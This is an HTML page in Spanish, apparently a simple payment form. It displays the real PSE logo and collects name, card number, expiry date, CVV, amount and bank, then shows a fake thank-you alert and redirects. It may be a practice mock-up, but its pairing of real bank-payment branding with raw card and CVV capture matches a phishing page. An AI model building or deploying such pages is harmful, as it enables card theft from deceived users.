<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pasarela de Pago Sencillo</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 600px;
            margin: auto;
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        h2 {
            text-align: center;
            color: #333;
        }
        label {
            display: block;
            margin-bottom: 8px;
            color: #555;
        }
        input[type="text"],
        input[type="number"],
        select {
            width: calc(100% - 20px);
            padding: 8px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 16px;
        }
        input[type="submit"] {
            background-color: #4CAF50;
            color: white;
            padding: 12px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
            width: 100%;
        }
        input[type="submit"]:hover {
            background-color: #45a049;
        }
        .img-pse {
            margin-bottom: 20px;
            display: flex;
            justify-content: center; 
            align-items: center;
           
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="img-pse">
            <img src="https://www.pse.com.co/image/layout_icon?img_id=1202326" alt="">
        </div>
        <form action="procesar_pago.php" method="post">
            <label for="nombre">Nombre completo:</label>
            <input type="text" id="nombre" name="nombre" required>

            <label for="tarjeta">Número de tarjeta:</label>
            <input type="text" id="tarjeta" name="tarjeta" pattern="[0-9]{16}" required placeholder="1234 5678 9012 3456">

            <label for="fecha">Fecha de expiración:</label>
            <input type="text" id="fecha" name="fecha" pattern="(0[1-9]|1[0-2])\/[0-9]{2}" required placeholder="MM/YY">

            <label for="cvv">CVV:</label>
            <input type="text" id="cvv" name="cvv" pattern="[0-9]{3,4}" required>

            <label for="monto">Monto a pagar:</label>
            <input type="number" id="monto" name="monto" step="any" required>
            <label for="banco">Seleccione su banco:</label>
            
            <select id="banco" name="banco" required>
                <option value="">Seleccione un banco</option>
                <option value="Banco de Bogotá">Banco de Bogotá</option>
                <option value="BBVA">BBVA</option>
                <option value="Bancolombia">Bancolombia</option>
                <option value="Davivienda">Davivienda</option>
                <option value="Citibank">Citibank</option>
                <!-- Agrega más opciones según sea necesario -->
            </select>
            <input type="submit" id="btnPagar" value="Pagar">
        </form>
    </div>
</body>
<script>
  var  pagar= document.querySelector('#btnPagar');
  pagar.addEventListener('click', function(event) {
    alert("GRACIAS POR SU COMPRA")
    window.location.href = "index.html";
  }
);

</script>
</html>
